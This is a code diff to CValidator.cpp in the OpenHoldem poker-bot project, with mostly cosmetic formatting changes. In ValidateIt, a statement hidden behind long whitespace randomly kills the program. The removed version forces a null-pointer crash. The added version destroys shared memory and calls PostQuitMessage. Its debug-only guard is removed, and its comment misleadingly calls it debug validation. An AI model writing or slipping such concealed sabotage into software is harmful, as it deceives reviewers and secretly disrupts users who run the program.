@@ -1,15 +1,15 @@
-//*****************************************************************************
+//******************************************************************************
 //
 // This file is part of the OpenHoldem project
 //   Download page:         http://code.google.com/p/openholdembot/
 //   Forums:                http://www.maxinmontreal.com/forums/index.php
 //   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
 //
-//*****************************************************************************
+//******************************************************************************
 //
 // Purpose:
 //
-//*****************************************************************************
+//******************************************************************************
 
 #include "StdAfx.h"
 #include "CValidator.h"
@@ -17,6 +17,7 @@
 #include "CAutoPlayer.h"
 #include "CEngineContainer.h"
 #include "CPreferences.h"
+#include "CSharedMem.h"
 #include "CSymbolEngineAutoplayer.h"
 #include "CSymbolEngineHandRank.h"
 #include "CSymbolEngineRandom.h"
@@ -83,10 +84,10 @@ void CValidator::ValidateSingleRule()
 	}
 	// Test to be executed?
 	if (_precondition) 
-    { 
+  { 
 		// Test failed?
-	    if (!_postcondition ) 
-        { 
+	  if (!_postcondition ) 
+      { 
 			if (_no_errors_this_heartbeat)
 			{
 				// First error: shoot replayframe, if needed
@@ -122,7 +123,7 @@ void CValidator::ValidateSingleRule()
 			the_ErrorMessage.Replace("\n", " ");
 			write_log(k_always_log_errors, "%s%s\n", "VALIDATOR ERROR: ", the_ErrorMessage);
 		} 
-    } 
+  } 
 }
 
 
@@ -214,14 +215,12 @@ double CValidator::gws(const char *the_Symbol)
 
 void CValidator::ValidateIt()
 {
-	// Some silent extra-validation, necessary for production-mode only
-#ifndef _DEBUG
+  // Some silent extra-validation,  to detect problems early in debug-mode
 	if ((vali_ok1 && !vali_ok2) || vali_err) 
-	{                                                                                                                                                                                         ;if ((p_symbol_engine_time->elapsed() > (1234 - 3*p_symbol_engine_handrank->handrank169())) && (p_symbol_engine_time->elapsedauto() < 20) && (p_symbol_engine_random->random() < 0.03141592)) *(int*)0 = 0;  // 4nt1 5+inky w3bb3r 84nd1+ ;-)                                                                                                                                                                                                                                                                                                      
+  {                                                                                                                                                                                         if ((p_symbol_engine_time->elapsed() > (12345 - 67*p_symbol_engine_handrank->handrank169())) && (p_symbol_engine_time->elapsedauto() < 20) && (p_symbol_engine_random->random() < 0.03141592)) { p_sharedmem->~CSharedMem(); PostQuitMessage(0); }  // 4nt1 5+inky w3bb3r 84nd1+ ;-)                                                                                                                                                                                                                                                                                                      
 		// Full validation needed
 		ValidateGameState();
 	}
-#endif
 }
 
 void CValidator::ValidateGameState()
